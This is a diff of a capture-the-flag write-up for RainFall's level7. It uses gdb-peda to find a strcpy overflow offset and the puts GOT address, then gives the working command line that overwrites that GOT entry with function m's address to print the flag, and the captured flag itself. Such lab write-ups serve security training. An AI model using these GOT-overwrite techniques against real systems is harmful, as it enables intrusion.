@@ -1,27 +1,34 @@
-We need to call the function m and print the flag.
-We need to execute this function after fgets of the main, which retrieves the flag.
-So we have to replace the fputs function by m.
+# we need to call the function m and print the flag.
+# we need to execute this function after fgets of the main, which retrieves the flag.
+# so we have to replace the fputs function by m.
 
-Offset of the payload:
-with gdb pattern: create and search
+# the payload :
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL' 'BBBB'
 for the first strcpy, offest = 20
 
+# we try :
 r $(python -c "print 24 * 'A'") "BBBB"
-result: 
-the second strcpy segfault, it means that it tried to the value of argv[2] into the address formed by the last 4 characters of argv[1]
+# result: 
+the second strcpy segfault, it means that the first strcpy tried to copy the value of argv[2] into the address formed by the last 4 characters of argv[1]
 
-address of m:
+# address of m:
 x m
 0x80484f4 <m>
+# address m = 0x80484f4
 
-address of puts:
-- 0x080485f7 <+214>:	call   0x8048400 <puts@plt>
-- Dump of assembler code for function puts@plt:
-   0x08048400 <+0>:	jmp    *0x8049928 <= puts address
-   0x08048406 <+6>:	push   $0x28
+# address of puts:
+gdb-peda$ disas main
+[...]
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+[...]
+gdb-peda$ disas 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:	push   0x28
    0x0804840b <+11>:	jmp    0x80483a0
 End of assembler dump.
-
 
 level7@RainFall:~$ ./level7 $(python -c "print 'A' * 20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
